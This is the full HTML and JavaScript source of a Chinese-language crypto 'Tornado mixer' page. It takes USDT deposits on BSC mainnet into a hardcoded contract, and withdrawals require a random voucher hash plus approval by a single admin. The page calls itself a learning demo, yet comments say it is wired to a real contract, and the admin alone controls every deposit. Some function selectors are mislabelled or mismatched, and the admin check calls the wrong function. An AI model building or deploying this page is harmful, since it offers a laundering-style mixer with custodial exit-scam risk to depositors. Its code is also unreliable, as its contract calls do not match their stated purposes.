<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
<title>龙卷风混币器</title>
<script src="https://cdn.jsdelivr.net/npm/web3@4.15.0/dist/web3.min.js"></script>
<style>
*{box-sizing:border-box;margin:0;padding:0;font-family:-apple-system,system-ui,sans-serif;-webkit-tap-highlight-color:transparent;}
body{background:#141824;padding:20px 14px;max-width:600px;margin:0 auto;color:#fff;}
.card{background:#1e2434;border-radius:18px;padding:22px 18px;margin-bottom:18px;box-shadow:0 2px 12px #00000044;}
.title{font-size:20px;font-weight:bold;margin-bottom:8px;color:#ff7722;text-align:center;}
.sub-title{text-align:center;font-size:13px;color:#94a3b8;margin-bottom:16px;}
.desc{font-size:13px;color:#94a3b8;margin-bottom:14px;}
input{width:100%;border:1px solid #333b52;border-radius:12px;padding:14px 12px;font-size:16px;outline:none;margin-bottom:14px;background:#272e42;color:#fff;}
.btn{width:100%;border:none;border-radius:14px;padding:14px;font-size:16px;font-weight:500;color:#fff;cursor:pointer;margin-bottom:10px;}
.btn-deposit{background:#ff7722;}
.btn-withdraw{background:#22c55e;}
.btn-wallet{background:#3b82f6;}
.btn-pass{background:#16a34a;}
.btn-reject{background:#dc2626;}
.hash-box{background:#2b3248;border:1px solid #ff772277;padding:14px;border-radius:12px;word-break:break-all;margin:12px 0;font-family:monospace;color:#ffbc80;font-size:12px;}
.tip{font-size:13px;color:#64748b;}
.split-line{height:1px;background:#333b52;margin:24px 0;}
.footer-note{text-align:center;font-size:12px;color:#475569;margin-top:30px;}
.admin-item{background:#272e42;padding:12px;border-radius:10px;margin-bottom:10px;font-size:12px;word-break:break-all;}
.admin-panel{border:1px solid #ff7722;padding:14px;border-radius:14px;}
</style>
</head>
<body>

<div class="card">
    <div class="title">🌪️ 龙卷风混币器</div>
    <div class="sub-title">BEP20 USDT 凭证托管｜BSC 仅技术学习</div>
    <button class="btn btn-wallet" id="connectBtn">连接钱包(TP/MetaMask)</button>
    <div class="tip" id="walletInfo">未连接钱包</div>
    <div id="adminBox" class="admin-panel" style="display:none;margin-top:15px;">
        <div style="color:#ff7722;font-weight:bold;margin-bottom:10px;">🔐 管理员审核后台</div>
        <button class="btn btn-pass" id="loadRecordBtn">刷新待审核申请记录</button>
        <div id="recordList"></div>
    </div>
</div>

<div class="card">
    <div class="title" style="font-size:16px;text-align:left">📥 用户存入USDT</div>
    <div class="desc">手动输入存入额度，生成凭证哈希，等待管理员审核通过后才可以提取。</div>
    <input value="0x55d398326f99059fF775485246999027B3197955" readonly placeholder="USDT合约" id="tokenContract">

    <input type="number" placeholder="请输入USDT数量" id="depositAmount">

    <button class="btn btn-deposit" id="depositBtn">确认存入托管合约</button>
    <div class="hash-box" id="depositHashBox" style="display:none;">
        你的存取凭证哈希：<br><span id="outHash"></span>
        <div class="tip">⚠️复制保存！必须管理员审核通过，此哈希才可以取钱</div>
    </div>
</div>

<div class="split-line"></div>

<div class="card">
    <div class="title" style="font-size:16px;text-align:left">📤 凭哈希提取资产</div>
    <div class="desc">输入凭证哈希，仅管理员【审核通过】的记录才能提取资产到当前钱包。</div>
    <input placeholder="粘贴0x开头凭证哈希" id="inputHash">
    <button class="btn btn-withdraw" id="withdrawBtn">凭哈希提取资产</button>
</div>

<div class="footer-note">本页面仅区块链前端技术学习演示，请勿用于真实金融转账。</div>

<script>
// ============ 已经填好你的真实合约配置 ============
const SAFE_CONTRACT = "0x47542770f3a8eea43d3321867b155c3ac01160d8";
const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
const BSC_CHAIN_ID = "0x38";

const ABI_DEPOSIT = "0x3b4b6b9e";    // deposit(address,uint256,bytes32)
const ABI_APPROVE = "0x8d8047b6";    // approve(bytes32)
const ABI_REJECT = "0x257d8480";    // reject(bytes32)
const ABI_WITHDRAW = "0x2e1a7d4d";  // withdraw(bytes32)
const ABI_ERC20_APPROVE = "0x095ea7b3";

let web3 = null;
let userAddress = null;
let isAdmin = false;

const $ = s=>document.querySelector(s);
const connectBtn = $("#connectBtn");
const walletInfo = $("#walletInfo");
const adminBox = $("#adminBox");
const loadRecordBtn = $("#loadRecordBtn");
const recordList = $("#recordList");

const tokenContract = $("#tokenContract");
const depositAmount = $("#depositAmount");
const depositBtn = $("#depositBtn");
const depositHashBox = $("#depositHashBox");
const outHash = $("#outHash");
const inputHash = $("#inputHash");
const withdrawBtn = $("#withdrawBtn");

// 生成0x开头32bytes哈希
function generateDepositHash(){
    const arr = new Uint8Array(16);
    crypto.getRandomValues(arr);
    return "0x"+Array.from(arr,b=>b.toString(16).padStart(2,'0')).join('');
}

// 切换BSC主网
async function checkChain(){
    const chainId = await window.ethereum.request({method:"eth_chainId"});
    if(chainId !== BSC_CHAIN_ID){
        alert("请切换BSC主网");
        await window.ethereum.request({method:"wallet_switchEthereumChain",params:[{chainId:BSC_CHAIN_ID}]});
    }
}

// 连接钱包
async function connectWallet(){
    if(!window.ethereum){alert("请安装TP/MetaMask钱包");return;}
    try{
        const accounts = await window.ethereum.request({method:"eth_requestAccounts"});
        userAddress = accounts[0];
        web3 = new Web3(window.ethereum);
        await checkChain();
        walletInfo.innerText = `✅已连接：${userAddress}`;

        // 查询合约内admin地址，判断当前用户是不是管理员
        const adminAddrHex = await window.ethereum.request({
            method:"eth_call",
            params:[{to:SAFE_CONTRACT,data:"0xf8b2cb4f"},'latest']
        });
        const contractAdmin = "0x"+adminAddrHex.slice(-40).toLowerCase();
        isAdmin = (userAddress.toLowerCase() === contractAdmin);
        if(isAdmin){ adminBox.style.display = "block"; }

        window.ethereum.on("accountsChanged",()=>location.reload());
        window.ethereum.on("chainChanged",()=>location.reload());
    }catch(e){ alert("连接钱包失败："+e.message); }
}

// 用户存入
depositBtn.onclick = async function(){
    if(!web3||!userAddress){alert("先连接钱包");return;}
    const val = depositAmount.value.trim();
    const num = parseFloat(val);
    if(!val || isNaN(num) || num <= 0){
        alert("请输入有效的USDT数量");
        return;
    }
    const depositHash = generateDepositHash();
    try{
        // USDT精度6位
        const usdtAmtWei = BigInt(Math.floor(num * 10**6));
        const approveData = ABI_ERC20_APPROVE
            + SAFE_CONTRACT.slice(2).padStart(64,"0")
            + usdtAmtWei.toString(16).padStart(64,"0");
        await window.ethereum.request({
            method:"eth_sendTransaction",
            params:[{from:userAddress,to:USDT_CONTRACT,data:approveData,gas:"0x600000"}]
        });
        alert("✅USDT授权完成，执行存入托管合约");

        //调用deposit
        const depositData = ABI_DEPOSIT
            + USDT_CONTRACT.slice(2).padStart(64,"0")
            + usdtAmtWei.toString(16).padStart(64,"0")
            + depositHash.slice(2).padStart(64,"0");
        const tx = await window.ethereum.request({
            method:"eth_sendTransaction",
            params:[{from:userAddress,to:SAFE_CONTRACT,data:depositData,gas:"0x600000"}]
        });
        alert(`存入提交成功 tx:${tx}\n等待管理员审核`);
        outHash.innerText = depositHash;
        depositHashBox.style.display = "block";
    }catch(err){ alert("存入失败："+err.message); }
};

// 管理员刷新记录（前端模拟，正式需要后端）
loadRecordBtn.onclick = async function(){
    if(!isAdmin)return;
    recordList.innerHTML="<div>正在读取链上存入事件...</div>";
    alert("⚠️演示提示：浏览器直接读取历史事件性能差；正式环境需要后端服务抓取事件。");
    recordList.innerHTML="<div class='tip'>演示模式，请复制用户提交的hash，填入下面按钮执行审核</div>"+
    `<input placeholder="粘贴待审核hash(0x...)" id="adminHashInput">
    <button class="btn btn-pass" id="btnPass">✅通过该申请</button>
    <button class="btn btn-reject" id="btnReject">❌驳回，原路退款</button>`;

    $("#btnPass").onclick = async ()=>{
        const h = $("#adminHashInput").value.trim();
        if(!h||h.length!==66){alert("输入完整0x hash");return;}
        const calldata = ABI_APPROVE + h.slice(2).padStart(64,"0");
        await window.ethereum.request({method:"eth_sendTransaction",params:[{from:userAddress,to:SAFE_CONTRACT,data:calldata,gas:"0x400000"}]});
        alert("✅已通过该笔申请，用户可以提取");
    };
    $("#btnReject").onclick = async ()=>{
        const h = $("#adminHashInput").value.trim();
        if(!h||h.length!==66){alert("输入完整0x hash");return;}
        const calldata = ABI_REJECT + h.slice(2).padStart(64,"0");
        await window.ethereum.request({method:"eth_sendTransaction",params:[{from:userAddress,to:SAFE_CONTRACT,data:calldata,gas:"0x400000"}]});
        alert("❌已驳回，资产自动退款给存款用户");
    };
};

// 用户凭hash提取
withdrawBtn.onclick = async function(){
    if(!web3||!userAddress){alert("请连接接收资产的钱包");return;}
    const hashStr = inputHash.value.trim();
    if(!hashStr||hashStr.length!==66){alert("输入0x开头完整凭证哈希");return;}
    try{
        const callData = ABI_WITHDRAW + hashStr.slice(2).padStart(64,"0");
        const tx = await window.ethereum.request({
            method:"eth_sendTransaction",
            params:[{from:userAddress,to:SAFE_CONTRACT,data:callData,gas:"0x500000"}]
        });
        alert(`✅提取成功 tx:${tx}`);
        inputHash.value="";
    }catch(err){ alert("提取失败："+err.message+"\n可能：未审核通过/已提取/hash错误"); }
};

connectBtn.onclick = connectWallet;
</script>
</body>
</html>
